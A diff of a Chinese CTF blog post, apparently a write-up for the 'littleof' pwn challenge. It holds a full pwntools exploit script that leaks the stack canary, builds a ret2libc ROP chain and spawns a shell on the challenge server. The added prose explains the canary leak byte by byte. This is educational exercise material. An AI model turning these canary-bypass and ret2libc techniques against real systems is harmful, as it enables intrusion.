@@ -195,19 +195,25 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Sun Aug 03 2025 14:38:05 GMT+0800">2025-08-03 14:38:05</span>
+                    <span class="datetime" data-updated="Mon Aug 25 2025 16:39:48 GMT+0800">2025-08-25 16:39:48</span>
                 </span>
             
         
 
         
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/exercise/">exercise</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
 
         
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/BUU/">BUU</a></li>
-                        
                     
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
                         
@@ -215,7 +221,7 @@
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%B0%8F%E7%AB%AF%E5%BA%8F/">小端序</a></li>
                         
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Canary/">Canary</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Canary%E7%BB%95%E8%BF%87/">Canary绕过</a></li>
                         
                     
                 </ul>
@@ -240,17 +246,35 @@
                     
 
                     
-                         <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250731154907695.png"  alt="image-20250731154907695"></p>
+                         <p><a class="link"   target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/468" >题目<i class="fas fa-external-link-alt"></i></a></p>
 <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250731154856931.png"  alt="image-20250731154856931"></p>
 <p>开启了canary保护</p>
 <p>所以用printf泄露canary的数值</p>
 <p>之后用ret2libc的方法解决</p>
-<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">#p = process(&#x27;./littleof&#x27;)</span><br><span class="line">p = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28230)</span><br><span class="line">elf = ELF(&quot;./littleof&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># canary</span><br><span class="line">payload1 = b&#x27;a&#x27; * (0x50 - 0x8) + b&#x27;b&#x27;</span><br><span class="line">p.recvuntil(b&#x27;Do you know how to do buffer overflow?\n&#x27;)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(b&#x27;b&#x27;)</span><br><span class="line">canary = u64(p.recv(7).rjust(8, b&#x27;\00&#x27;))</span><br><span class="line">print(f&quot;canary :&#123;hex(canary)&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ret2libc</span><br><span class="line">rdi = 0x400863</span><br><span class="line">ret = 0x40059e</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">main = 0x400789</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27; *0x48 + p64(canary)</span><br><span class="line">payload2+= p64(0) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;I hope you win\n&#x27;)</span><br><span class="line">puts_addr = u64(p.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(8, b&#x27;\00&#x27;))</span><br><span class="line">print(f&quot;puts_addr: &#123;hex(puts_addr)&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(p,&quot;b *0x0000000000400787&quot;)</span><br><span class="line">payload3 = b&#x27;a&#x27; * (0x50 - 0x8) + p64(canary) + p64(0)</span><br><span class="line">payload3+=p64(ret)+ p64(rdi) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">#p = process(&#x27;./littleof&#x27;)</span><br><span class="line">p = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28230)</span><br><span class="line">elf = ELF(&quot;./littleof&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># canary泄露</span><br><span class="line">payload1 = b&#x27;a&#x27; * (0x50 - 0x8) + b&#x27;b&#x27;</span><br><span class="line">p.recvuntil(b&#x27;Do you know how to do buffer overflow?\n&#x27;)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(b&#x27;b&#x27;)</span><br><span class="line">canary = u64(p.recv(7).rjust(8, b&#x27;\00&#x27;))</span><br><span class="line">print(f&quot;canary :&#123;hex(canary)&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ret2libc</span><br><span class="line">rdi = 0x400863</span><br><span class="line">ret = 0x40059e</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">main = 0x400789</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27; *0x48 + p64(canary)</span><br><span class="line">payload2+= p64(0) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;I hope you win\n&#x27;)</span><br><span class="line">puts_addr = u64(p.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(8, b&#x27;\00&#x27;))</span><br><span class="line">print(f&quot;puts_addr: &#123;hex(puts_addr)&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(p,&quot;b *0x0000000000400787&quot;)</span><br><span class="line">payload3 = b&#x27;a&#x27; * (0x50 - 0x8) + p64(canary) + p64(0)</span><br><span class="line">payload3+=p64(ret)+ p64(rdi) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">canary = u64(p.recv(7).rjust(8, b&#x27;\00&#x27;))</span><br></pre></td></tr></table></figure>
 
 <p>此时读取的还是小端序。所以在左侧补位\x00</p>
-<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><h3 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leaked = p.recv(8)           # 收到 8 字节：b&#x27;\x00\x12\x34\x56\x78\x9a\xbc\xde&#x27;</span><br><span class="line">value = u64(leaked)          # → 0xdebc9a7856341200</span><br></pre></td></tr></table></figure>
+<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><h3 id="canary接收"><a href="#canary接收" class="headerlink" title="canary接收"></a>canary接收</h3><p>假设我们现在要泄露的 Canary 值是 0x1122334455667700。</p>
+<p>步骤一：内存中的原始状态</p>
+<p>在程序运行的内存中，这个 Canary 值以小端序存储。这意味着它的字节顺序是反过来的。</p>
+<p>内存地址 (低) -&gt; Canary 字节序 (高)         \x00\x77\x66\x55\x44\x33\x22\x11 ，Canary 的最低字节是 \x00，存储在最低地址。</p>
+<p>步骤二：构造并发送第一个 Payload (泄露)</p>
+<p>我们构造 Payload：b’a’ * 0x48 + b’b’。</p>
+<p>程序接收后，缓冲区被填满，b’b’ 覆盖了 Canary 的最低字节 \x00。</p>
+<p>现在，内存中的 Canary 变成了： \x62\x77\x66\x55\x44\x33\x22\x11，\x62 是字符 ‘b’ 的十六进制值。</p>
+<p>步骤三：程序输出泄露的数据</p>
+<p>程序使用 printf(“%s”, buf) 这样的方式将栈上的数据当成字符串输出。它会从 buf 开始向后打印，直到遇到第一个空字节 \x00。</p>
+<p>由于我们用 b 覆盖了 Canary 的最低字节，printf 不会在这里停止，而是继续向后打印。</p>
+<p>它会打印出 b 加上 Canary 剩下的 7 个字节：\x62\x77\x66\x55\x44\x33\x22\x11</p>
+<p>步骤四：脚本接收并处理泄露数据</p>
+<p>我们的 Python 脚本执行 p.recvuntil(b’b’)，先接收到 b，然后执行 p.recv(7)，接收剩下的 7 个字节\x77\x66\x55\x44\x33\x22\x11</p>
+<p>接下来，我们用 rjust(8, b’\x00’) 来恢复 Canary，就canary的小端序情况来看，在数据左侧添一个”\x00”,所以要用rjust（把现有数据放右边）</p>
+<p>最后，我们用 u64() 将这个完整的 8 字节小端序数据转换回一个整数：</p>
+<p>canary &#x3D; u64(b’\x00\x77\x66\x55\x44\x33\x22\x11’)结果就是：0x1122334455667700</p>
+<p>至此，Canary 泄露完成。</p>
+<h3 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leaked = p.recv(8)           # 收到 8 字节：b&#x27;\x00\x12\x34\x56\x78\x9a\xbc\xde&#x27;</span><br><span class="line">value = u64(leaked)          # → 0xdebc9a7856341200</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">target_addr = 0x401123</span><br><span class="line">p.send(p64(target_addr))     # → 发送 b&#x27;\x23\x11\x40\x00\x00\x00\x00\x00&#x27;</span><br></pre></td></tr></table></figure>
 
@@ -313,10 +337,6 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/BUU/">BUU</a>
-                                    </li>
-                                
-                                    <li class="tag-item border-box">
                                         <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
                                     </li>
                                 
@@ -325,7 +345,7 @@
                                     </li>
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Canary/">Canary</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Canary%E7%BB%95%E8%BF%87/">Canary绕过</a>
                                     </li>
                                 
                             </ul>
@@ -361,11 +381,11 @@
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2025/07/29/ez-pz-hackover-2016/"
-                                   title="ez_pz_hackover_2016"
+                                   href="/2025/07/29/gyctf-2020-borrowstack/"
+                                   title="gyctf_2020_borrowstack"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">ez_pz_hackover_2016</span>
+                                        <span class="post-nav-title-item text-ellipsis">gyctf_2020_borrowstack</span>
                                         <span class="post-nav-item">Next posts</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
